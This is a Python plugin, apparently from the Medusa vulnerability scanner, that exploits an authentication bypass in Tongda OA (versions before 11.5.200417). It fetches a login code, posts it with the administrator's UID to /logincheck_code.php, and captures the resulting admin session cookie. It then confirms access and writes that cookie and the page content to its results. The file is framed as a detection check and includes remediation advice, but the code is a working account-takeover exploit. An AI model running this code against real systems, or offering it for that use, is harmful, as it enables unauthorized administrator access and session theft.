#!/usr/bin/env python
# -*- coding: utf-8 -*-
__author__ = 'Ascotbe'
from ClassCongregation import VulnerabilityDetails,UrlProcessing,ErrorLog,WriteFile,ErrorHandling,Proxies
import urllib3
import requests
urllib3.disable_warnings(urllib3.exceptions.InsecureRequestWarning)
class VulnerabilityInfo(object):
    def __init__(self,Medusa):
        self.info = {}
        self.info['number']="0" #如果没有CVE或者CNVD编号就填0，CVE编号优先级大于CNVD
        self.info['author'] = "Ascotbe"  # 插件作者
        self.info['create_date'] = "2020-4-22"  # 插件编辑时间
        self.info['disclosure'] = '2020-4-20'  # 漏洞披露时间，如果不知道就写编写插件的时间
        self.info['algroup'] = "TongdaOaUsesAnyAdministratorAccountToLogIn"  # 插件名称
        self.info['name'] ='通达OA任意使用管理员账号登录' #漏洞名称
        self.info['affects'] = "通达OA"  # 漏洞组件
        self.info['desc_content'] = "攻击者通过构造恶意请求，可以直接绕过登录验证逻辑，伪装为系统管理员身份登录OA系统。"  # 漏洞描述
        self.info['rank'] = "高危"  # 漏洞等级
        self.info['version'] = "通达OA<11.5.200417版本"  # 这边填漏洞影响的版本
        self.info['suggest'] = "升级最新通达OA版本"  # 修复建议
        self.info['details'] = Medusa  # 结果


def medusa(Url:str,Headers:dict,proxies:str=None,**kwargs)->None:
    proxies=Proxies().result(proxies)
    scheme, url, port = UrlProcessing().result(Url)
    if port is None and scheme == 'https':
        port = 443
    elif port is None and scheme == 'http':
        port = 80
    else:
        port = port
    try:
        payload = '/general/login_code.php'
        payload_url = scheme + "://" + url + ":" + str(port) + payload
        payload2 ='/logincheck_code.php'
        payload_url2 = scheme + "://" + url + ":" + str(port) + payload2
        payload3="/general/index.php"
        payload_url3 = scheme + "://" + url + ":" + str(port) + payload3

        res = requests.get(payload_url, headers=Headers, proxies=proxies, timeout=6, verify=False)
        restext = str(res.text).split('{')
        codeuid = restext[-1].replace('}"}', '').replace('\r\n', '')
        resp = requests.post(payload_url2,data={'CODEUID': '{'+codeuid+'}', 'UID': int(1)},headers=Headers, proxies=proxies, timeout=6, verify=False)
        head = resp.headers.get('Set-Cookie').replace('path=/', '')

        Headers["Cookie"]=head

        resp2 = requests.get(payload_url3,headers=Headers, proxies=proxies, timeout=6, verify=False)
        code = resp2.status_code
        con=resp2.text
        if code == 200 and (con.find("""<li><a id="on_status_1" href="javascript:""")!=-1 and con.find("""<a id="logout_btn" class="logout" href="javascript""")!=-1 ) or (con.find("通达云市场")!=-1 and con.find("通达OA在线帮助")!=-1 and con.find("注销")!=-1):
            Medusa = "{}存在通达OA任意使用管理员账号登录漏洞\r\n验证数据:\r\n管理员COOKIE:{}\r\n漏洞返回页面:{}\r\n".format(url,head,con)
            _t = VulnerabilityInfo(Medusa)
            VulnerabilityDetails(_t.info, url,**kwargs).Write()  # 传入url和扫描到的数据
            WriteFile().result(str(url),str(Medusa))#写入文件，url为目标文件名统一传入，Medusa为结果
    except Exception as e:
        _ = VulnerabilityInfo('').info.get('algroup')
        ErrorHandling().Outlier(e, _)
        _l = ErrorLog().Write("Plugin Name:"+_+" || Target Url:"+url,e)#调用写入类

